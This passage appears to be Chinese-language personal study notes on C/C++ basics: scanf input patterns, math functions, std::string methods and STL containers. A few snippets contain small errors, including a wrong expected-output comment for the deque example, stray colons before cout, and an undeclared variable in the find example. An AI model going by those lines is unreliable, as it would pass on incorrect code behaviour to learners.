j++) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot; %c&quot;</span>, &amp;mat[i][j]);  <span class="hljs-comment">// 输入字符矩阵的每个字符</span><br>    &#125;<br>&#125;<br><br><br><br><br><br> <span class="hljs-comment">/*输入带有特殊符号的字符串*/</span><br><span class="hljs-type">char</span> str[<span class="hljs-number">100</span>];<br>getchar();  <span class="hljs-comment">// 清除换行符</span><br>fgets(str, <span class="hljs-keyword">sizeof</span>(str), <span class="hljs-built_in">stdin</span>);  <span class="hljs-comment">// 输入带特殊符号的字符串</span><br><br><br><span class="hljs-comment">/*输入多个有特定关系的数据（如边和节点）</span><br><span class="hljs-comment">3</span><br><span class="hljs-comment">1 2</span><br><span class="hljs-comment">2 3</span><br><span class="hljs-comment">3 4</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> n, m;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);  <span class="hljs-comment">// 输入节点数和边数</span><br><span class="hljs-type">int</span> edges[m][<span class="hljs-number">2</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>, &amp;edges[i][<span class="hljs-number">0</span>], &amp;edges[i][<span class="hljs-number">1</span>]);  <span class="hljs-comment">// 输入每条边的两个端点</span><br>&#125;<br><br><br><span class="hljs-comment">/*输入多个日期和时间格式的数据</span><br><span class="hljs-comment">2022-02-18 12:30:00</span><br><span class="hljs-comment">2023-03-19 14:45:00</span><br><span class="hljs-comment">*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> <span class="hljs-title">t</span>;</span><br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d-%d-%d %d:%d:%d&quot;</span>, &amp;t.tm_year, &amp;t.tm_mon, &amp;t.tm_mday, &amp;t.tm_hour, &amp;t.tm_min, &amp;t.tm_sec) != EOF) &#123;<br>    t.tm_year -= <span class="hljs-number">1900</span>;  <span class="hljs-comment">// 日期格式调整</span><br>    t.tm_mon -= <span class="hljs-number">1</span>;  <span class="hljs-comment">// 月份从0开始</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d-%02d-%02d %02d:%02d:%02d\n&quot;</span>, t.tm_year + <span class="hljs-number">1900</span>, t.tm_mon + <span class="hljs-number">1</span>, t.tm_mday, t.tm_hour, t.tm_min, t.tm_sec);<br>&#125;<br><br><br><br><br><br></code></pre></td></tr></table></figure><h4 id="2-基本数学函数"><a href="#2-基本数学函数" class="headerlink" title="2.基本数学函数"></a>2.<strong>基本数学函数</strong></h4><ul><li><strong><code>abs(int x)</code></strong>: 返回整数 <code>x</code> 的绝对值。</li><li><strong><code>fabs(double x)</code></strong>: 返回浮点数 <code>x</code> 的绝对值。</li><li><strong><code>sqrt(double x)</code></strong>: 返回 <code>x</code> 的平方根。</li><li><strong><code>pow(double base, double exp)</code></strong>: 返回 <code>base</code> 的 <code>exp</code> 次方。</li><li><strong><code>exp(double x)</code></strong>: 返回 <code>e</code> 的 <code>x</code> 次方。</li><li><strong><code>log(double x)</code></strong>: 返回 <code>x</code> 的自然对数。</li><li><strong><code>log10(double x)</code></strong>: 返回 <code>x</code> 的以 10 为底的对数。</li><li><strong><code>ceil(double x)</code></strong>: 返回大于或等于 <code>x</code> 的最小整数。</li><li><strong><code>floor(double x)</code></strong>: 返回小于或等于 <code>x</code> 的最大整数。</li><li><strong><code>round(double x)</code></strong>: 返回最接近 <code>x</code> 的整数。</li></ul><p><strong>三角函数</strong></p><ul><li><strong><code>sin(double x)</code></strong>: 返回 <code>x</code> 的正弦值。</li><li><strong><code>cos(double x)</code></strong>: 返回 <code>x</code> 的余弦值。</li><li><strong><code>tan(double x)</code></strong>: 返回 <code>x</code> 的正切值。</li><li><strong><code>asin(double x)</code></strong>: 返回 <code>x</code> 的反正弦值。</li><li><strong><code>acos(double x)</code></strong>: 返回 <code>x</code> 的反余弦值。</li><li><strong><code>atan(double x)</code></strong>: 返回 <code>x</code> 的反正切值。</li><li><strong><code>atan2(double y, double x)</code></strong>: 计算 <code>y/x</code> 的反正切值，考虑象限。</li></ul><p><strong>常数</strong></p><ul><li><strong><code>M_PI</code></strong>: <code>π</code> 的值。</li><li><strong><code>M_E</code></strong>: <code>e</code> 的值。</li></ul><p><strong>其他函数</strong></p><ul><li><strong><code>modf(double x, double\* intpart)</code></strong>: 拆分 <code>x</code> 为整数部分和小数部分。</li><li><strong><code>fmod(double x, double y)</code></strong>: 返回 <code>x</code> 除 <code>y</code> 的余数。</li><li><strong><code>hypot(double x, double y)</code></strong>: 返回 <code>sqrt(x^2 + y^2)</code>。</li></ul><p><strong>随机数</strong></p><ul><li><strong><code>rand()</code></strong>: 返回一个随机整数。</li><li><strong><code>srand(unsigned int seed)</code></strong>: 设置随机数种子。</li></ul><p><strong>特殊值判断</strong></p><ul><li><code>isnan(double x)</code>: 判断 <code>x</code> 是否为 NaN。</li><li><strong><code>isfinite(double x)</code></strong>: 判断 <code>x</code> 是否为有限值。</li><li><strong><code>isinf(double x)</code></strong>: 判断 <code>x</code> 是否为无穷大。</li></ul><hr><h3 id="2-字符"><a href="#2-字符" class="headerlink" title="2.字符"></a>2.字符</h3><p>C++ 中，每个常用字符对应一个整数值，通常称为 ASCII 值。可以通过字符与对应的整数值相互转化。</p><ul><li><h4 id="字符与-ASCII-码："><a href="#字符与-ASCII-码：" class="headerlink" title="字符与 ASCII 码："></a><strong>字符与 ASCII 码：</strong></h4><ul><li>‘A’ - ‘Z’ 对应的 ASCII 值是 65 ~ 90</li><li>‘a’ - ‘z’ 对应的 ASCII 值是 97 ~ 122</li><li>‘0’ - ‘9’ 对应的 ASCII 值是 48 ~ 57</li></ul></li><li><p><strong>字符可以参与运算：</strong></p><ul><li>运算时，字符会被当做整数处理，使用其对应的 ASCII 值。</li></ul></li></ul><p>字符串在 C++ 中本质上是一个字符数组，数组的末尾有一个特殊的结束符 <code>&#39;\0&#39;</code>。所以输出字符串就直接输出arr这个就行 char arr[]&#x3D;”hello world”;</p><h4 id="字符数组的常用操作"><a href="#字符数组的常用操作" class="headerlink" title="字符数组的常用操作"></a><strong>字符数组的常用操作</strong></h4><ol><li><code>strlen(str)</code>：计算字符串长度。</li><li><code>strcmp(a, b)</code>：比较两个字符串，按字典序比较。</li><li><code>strcpy(a, b)</code>：将字符串 <code>b</code> 复制到 <code>a</code>。</li></ol><hr><h4 id="标准库类型-string"><a href="#标准库类型-string" class="headerlink" title="标准库类型 string"></a>标准库类型 <code>string</code></h4><p><code>string</code> 是一个动态的字符序列 等同于char arr[]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> s1 = <span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-built_in">string</span> <span class="hljs-title function_">s2</span><span class="hljs-params">(<span class="hljs-number">5</span>, <span class="hljs-string">&#x27;c&#x27;</span>)</span>;  <span class="hljs-comment">// 初始化为 &quot;ccccc&quot;</span><br></code></pre></td></tr></table></figure><p><strong><code>string</code> 上的常见操作</strong></p><p>读取单个单词</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str;<br><span class="hljs-built_in">cin</span> &gt;&gt; str;<br></code></pre></td></tr></table></figure><p><strong><code>getline</code> 读取一整行</strong>:使用时记得检查之前的scanf如果有就getchar();清除一下缓存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">getline(<span class="hljs-built_in">cin</span>, str);  <span class="hljs-comment">// 读取一整行输入</span><br></code></pre></td></tr></table></figure><p><strong><code>empty</code> 和 <code>size</code></strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;字符串是否为空: &quot;</span> &lt;&lt; str.empty() <br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;字符串的长度: &quot;</span> &lt;&lt; str.size() <br></code></pre></td></tr></table></figure><p><strong><code>string</code> 的比较：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">if</span> (s1 &lt; s2) &#123;<br>     <span class="hljs-built_in">cout</span> &lt;&lt; s1 &lt;&lt; <span class="hljs-string">&quot; 小于 &quot;</span> &lt;&lt; s2 &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong><code>string</code> 赋值与拼接</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> s3 = s1 + <span class="hljs-string">&quot;, &quot;</span> + s2;<br></code></pre></td></tr></table></figure><p><strong>find查询子串</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (pos != <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) &#123;       <span class="hljs-comment">//如果没找到，返回std::string::npos</span><br>    :<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Found at position &quot;</span> &lt;&lt; pos &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Not found&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>substr()</code></strong></p><p>从字符串中提取子串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Hello, world!&quot;</span>;<br><span class="hljs-built_in">string</span> sub = str.substr(<span class="hljs-number">7</span>, <span class="hljs-number">5</span>);  <span class="hljs-comment">// 从索引 7 开始，提取 5 个字符</span><br><span class="hljs-built_in">cout</span> &lt;&lt; sub;  <span class="hljs-comment">// 输出 &quot;world&quot;</span><br></code></pre></td></tr></table></figure><p> <strong><code>c_str()</code></strong></p><p>将 <code>std::string</code> 转换为 C 风格字符串（即以 <code>&#39;\0&#39;</code> 结尾的字符数组）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Hello&quot;</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span>* cstr = str.c_str();<br><span class="hljs-built_in">cout</span> &lt;&lt; cstr;  <span class="hljs-comment">// 输出 &quot;Hello&quot;</span><br></code></pre></td></tr></table></figure><ul><li><code>c_str()</code> 返回一个指向字符串的常量指针（<code>const char*</code>）。</li></ul><p><strong><code>append()</code></strong></p><p>将另一个字符串或字符附加到当前字符串的末尾。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Hello&quot;</span>;<br>str.append(<span class="hljs-string">&quot;, world!&quot;</span>);<br><span class="hljs-built_in">cout</span> &lt;&lt; str;  <span class="hljs-comment">// 输出 &quot;Hello, world!&quot;</span><br></code></pre></td></tr></table></figure><p><strong><code>push_back()</code></strong></p><p>向字符串末尾添加一个字符。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Hello&quot;</span>;<br>str.push_back(<span class="hljs-string">&#x27;!&#x27;</span>);<br><span class="hljs-built_in">cout</span> &lt;&lt; str;  <span class="hljs-comment">// 输出 &quot;Hello!&quot;</span><br></code></pre></td></tr></table></figure><p><strong><code>insert()</code></strong></p><p>在指定位置插入字符或子字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Hello, world!&quot;</span>;<br>str.insert(<span class="hljs-number">5</span>, <span class="hljs-string">&quot;, beautiful&quot;</span>);<br><span class="hljs-built_in">cout</span> &lt;&lt; str;  <span class="hljs-comment">// 输出 &quot;Hello, beautiful world!&quot;</span><br></code></pre></td></tr></table></figure><ul><li><code>insert(pos, str)</code>：在位置 <code>pos</code> 插入字符串 <code>str</code>。</li><li><code>insert(pos, n, c)</code>：在位置 <code>pos</code> 插入 <code>n</code> 个字符 <code>c</code>。</li></ul><p> <strong><code>erase()</code></strong></p><p>删除指定位置的字符或子字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Hello, world!&quot;</span>;<br>str.erase(<span class="hljs-number">5</span>, <span class="hljs-number">7</span>);  <span class="hljs-comment">// 从索引 5 开始，删除 7 个字符</span><br><span class="hljs-built_in">cout</span> &lt;&lt; str;  <span class="hljs-comment">// 输出 &quot;Hello!&quot;</span><br></code></pre></td></tr></table></figure><ul><li><code>erase(pos, len)</code>：删除从 <code>pos</code> 开始，长度为 <code>len</code> 的子串。</li></ul><p><strong><code>replace()</code></strong></p><p>替换指定位置的字符或子字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Hello, world!&quot;</span>;<br>str.replace(<span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&quot;C++&quot;</span>);<br>:<span class="hljs-built_in">cout</span> &lt;&lt; str;  <span class="hljs-comment">// 输出 &quot;Hello, C++!&quot;</span><br></code></pre></td></tr></table></figure><ul><li><code>replace(pos, len, str)</code>：从 <code>pos</code> 开始，删除 <code>len</code> 个字符并用 <code>str</code> 替换它们。</li></ul><p><strong><code>compare()</code></strong></p><p>比较两个字符串的大小（按字典序比较）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str1 = <span class="hljs-string">&quot;apple&quot;</span>;<br><span class="hljs-built_in">string</span> str2 = <span class="hljs-string">&quot;banana&quot;</span>;<br><span class="hljs-type">int</span> result = str1.compare(str2);  <span class="hljs-comment">// 返回负值，因为 &quot;apple&quot; 小于 &quot;banana&quot;</span><br><span class="hljs-built_in">cout</span> &lt;&lt; result;  <span class="hljs-comment">// 输出负数</span><br></code></pre></td></tr></table></figure><ul><li><code>compare()</code>：返回值是 <code>0</code> 表示两个字符串相等，负值表示当前字符串小于比较字符串，正值表示当前字符串大于比较字符串。</li></ul><p><strong><code>find_first_of()</code></strong></p><p>查找字符串中第一个包含指定字符或字符集的位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Hello, world!&quot;</span>;<br><span class="hljs-type">size_t</span> pos = str.find_first_of(<span class="hljs-string">&quot;aeiou&quot;</span>);  <span class="hljs-comment">// 查找第一个元音字母的位置</span><br><span class="hljs-built_in">cout</span> &lt;&lt; pos;  <span class="hljs-comment">// 输出 1，表示 &#x27;e&#x27; 是第一个元音</span><br></code></pre></td></tr></table></figure><ul><li><code>find_first_of(str)</code>：返回第一次出现字符集中任意字符的索引位置。</li></ul><p> <strong><code>find_last_of()</code></strong></p><p>查找字符串中最后一个包含指定字符或字符集的位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Hello, world!&quot;</span>;<br><span class="hljs-type">size_t</span> pos = str.find_last_of(<span class="hljs-string">&quot;aeiou&quot;</span>);  <span class="hljs-comment">// 查找最后一个元音字母的位置</span><br><span class="hljs-built_in">cout</span> &lt;&lt; pos;  <span class="hljs-comment">// 输出 8，表示 &#x27;o&#x27; 是最后一个元音</span><br></code></pre></td></tr></table></figure><ul><li><code>find_last_of(str)</code>：返回最后一次出现字符集中的任意字符的位置。</li></ul><p><strong><code>rfind()</code></strong></p><p>从字符串的尾部开始查找指定子串的位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;Hello, world! world!&quot;</span>;<br><span class="hljs-type">size_t</span> pos = str.rfind(<span class="hljs-string">&quot;world&quot;</span>);  <span class="hljs-comment">// 查找最后一次出现 &quot;world&quot; 的位置</span><br><span class="hljs-built_in">cout</span> &lt;&lt; pos;  <span class="hljs-comment">// 输出 13</span><br></code></pre></td></tr></table></figure><ul><li><code>rfind(str)</code>：返回从尾部开始查找子串的位置。</li></ul><p> <strong><code>to_string()</code></strong></p><p>将数字类型转换为字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> num = <span class="hljs-number">123</span>;<br><span class="hljs-built_in">string</span> str = <span class="hljs-built_in">std</span>::to_string(num);  <span class="hljs-comment">// &quot;123&quot;</span><br><span class="hljs-built_in">cout</span> &lt;&lt; str;<br></code></pre></td></tr></table></figure><p><strong><code>stoi()</code>, <code>stol()</code>, <code>stof()</code>, <code>stod()</code> 等</strong></p><p>将字符串转换为整数、长整型、浮点数等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;12345&quot;</span>;<br><span class="hljs-type">int</span> num = <span class="hljs-built_in">std</span>::stoi(str);  <span class="hljs-comment">// 将字符串转换为整数</span><br><span class="hljs-built_in">cout</span> &lt;&lt; num;  <span class="hljs-comment">// 输出 12345</span><br></code></pre></td></tr></table></figure><p> <strong><code>trim()</code> (自定义实现)</strong></p><p>C++ 标准库并没有直接提供 <code>trim</code> 函数来去除字符串两端的空白字符，但你可以通过自定义函数来实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">:<span class="hljs-built_in">string</span> <span class="hljs-title function_">trim</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-built_in">string</span>&amp; str)</span> &#123;<br>    <span class="hljs-keyword">auto</span> start = str.find_first_not_of(<span class="hljs-string">&quot; \t\n\r&quot;</span>);<br>    <span class="hljs-keyword">auto</span> end = str.find_last_not_of(<span class="hljs-string">&quot; \t\n\r&quot;</span>);<br>    <span class="hljs-keyword">return</span> (start == <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos || end == <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>::npos) ? <span class="hljs-string">&quot;&quot;</span> : str.substr(start, end - start + <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">string</span> str = <span class="hljs-string">&quot;   Hello, world!   &quot;</span>;<br>   <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; trim(str) &lt;&lt; <span class="hljs-string">&quot;|&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// 输出 &quot;|Hello, world!|&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>++++</p><h3 id="3-函数"><a href="#3-函数" class="headerlink" title="3.函数"></a>3.函数</h3><p>当初始化一个非引用类型的变量时，初始值被拷贝给变量。此时，对变量的改动不会影响初始值。当函数的形参为引用类型时，对形参的修改会影响实参的值。使用引用的作用：避免拷贝、让函数返回额外信息。</p><p>++++</p><h3 id="4-STL"><a href="#4-STL" class="headerlink" title="4.STL"></a>4.STL</h3><h4 id="一-STL-的主要组成部分"><a href="#一-STL-的主要组成部分" class="headerlink" title="一.STL 的主要组成部分"></a>一.STL 的主要组成部分</h4><ol><li>容器 ：用来存储和管理数据的集合。</li><li>算法 ：用于对数据进行操作，如排序、查找、修改等。</li><li>迭代器：用于遍历容器中的元素，提供统一的访问接口。</li></ol><h4 id="二、容器-Containers"><a href="#二、容器-Containers" class="headerlink" title="二、容器 (Containers)"></a>二、容器 (Containers)</h4><p>STL 容器分为三类：<strong>顺序容器</strong>、<strong>关联容器</strong>和<strong>无序关联容器</strong>。</p><h5 id="1-顺序容器"><a href="#1-顺序容器" class="headerlink" title="1.顺序容器"></a>1.顺序容器</h5><p>顺序容器存储数据时，元素按插入顺序排列，常见的顺序容器有：</p><ul><li><code>vector</code>：动态数组，支持快速随机访问。</li><li><code>deque</code>：双端队列，支持两端快速插入和删除。</li><li><code>list</code>：双向链表，支持双向遍历，插入和删除操作效率较高。</li><li><code>array</code>：定长数组（C++11 引入），存储固定大小的数据。</li><li><code>forward_list</code>：单向链表（C++11 引入），支持单向遍历。</li></ul><p><strong><code>vector</code></strong> 动态数组</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;  <span class="hljs-comment">// 初始化</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">vec</span><span class="hljs-params">(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>)</span></span>;  <span class="hljs-comment">// 创建一个大小为 5，值为 0 的 vector</span><br><br><br><br>vec.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">4</span>);  <span class="hljs-comment">// 尾部添加元素</span><br><span class="hljs-type">bool</span> isEmpty = vec.<span class="hljs-built_in">empty</span>();  <span class="hljs-comment">// 返回 true 如果 vector 为空</span><br><span class="hljs-type">int</span> n = vec.<span class="hljs-built_in">size</span>();<br>vec.<span class="hljs-built_in">pop_back</span>();<br>vec.<span class="hljs-built_in">clear</span>();<br><br>vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">matrix</span>(<span class="hljs-number">3</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(<span class="hljs-number">4</span>, <span class="hljs-number">0</span>));<br>matrix.<span class="hljs-built_in">push_back</span>(&#123;<span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>&#125;);  <span class="hljs-comment">// 添加新的一行</span><br><br>vec.<span class="hljs-built_in">resize</span>(<span class="hljs-number">10</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">// 改变 `vec` 的大小为 10，新增的元素初始化为 0</span><br><br>vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br>vec.<span class="hljs-built_in">insert</span>(vec.<span class="hljs-built_in">begin</span>() + <span class="hljs-number">2</span>, <span class="hljs-number">3</span>);  <span class="hljs-comment">// 在第三个位置插入 3，变为 &#123;1, 2, 3, 4, 5&#125;</span><br><br>vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br>vec.<span class="hljs-built_in">erase</span>(vec.<span class="hljs-built_in">begin</span>() + <span class="hljs-number">2</span>);  <span class="hljs-comment">// 删除第三个元素，变为 &#123;1, 2, 4, 5&#125;</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><span class="hljs-keyword">auto</span> it = <span class="hljs-built_in">find</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), <span class="hljs-number">3</span>);<br><span class="hljs-keyword">if</span> (it != vec.<span class="hljs-built_in">end</span>()) &#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Found 3 at index: &quot;</span> &lt;&lt; std::<span class="hljs-built_in">distance</span>(vec.<span class="hljs-built_in">begin</span>(), it) &lt;&lt; std::endl;<br>&#125;<br><br>vector&lt;<span class="hljs-type">int</span>&gt; vec = &#123;<span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>&#125;;<br><span class="hljs-built_in">sort</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>());  <span class="hljs-comment">// 升序排序</span><br><span class="hljs-built_in">reverse</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>());  <span class="hljs-comment">// 变为 &#123;5, 4, 3, 2, 1&#125;</span><br><span class="hljs-type">int</span> sum = std::<span class="hljs-built_in">accumulate</span>(vec.<span class="hljs-built_in">begin</span>(), vec.<span class="hljs-built_in">end</span>(), <span class="hljs-number">0</span>);  <span class="hljs-comment">// 计算和，结果是 15</span><br><br>vec.<span class="hljs-built_in">reserve</span>(<span class="hljs-number">1000</span>);  <span class="hljs-comment">// 预分配空间，避免扩容</span><br></code></pre></td></tr></table></figure><p><strong><code>deque</code></strong> 双端队列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">deque</span>&lt;<span class="hljs-type">int</span>&gt; dq = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br>dq.push_front(<span class="hljs-number">0</span>);  <span class="hljs-comment">// 在头部插入元素</span><br>dq.push_back(<span class="hljs-number">4</span>);   <span class="hljs-comment">// 在尾部插入元素</span><br>dq.pop_front();    <span class="hljs-comment">// 移除头部元素</span><br>dq.pop_back();     <span class="hljs-comment">// 移除尾部元素</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v : dq) &#123;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; v &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// 输出：2 3</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>list</code></strong> 双向链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">list</span>&lt;<span class="hljs-type">int</span>&gt; lst = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br>lst.push_front(<span class="hljs-number">0</span>);  <span class="hljs-comment">// 在头部插入</span><br>lst.push_back(<span class="hljs-number">4</span>);   <span class="hljs-comment">// 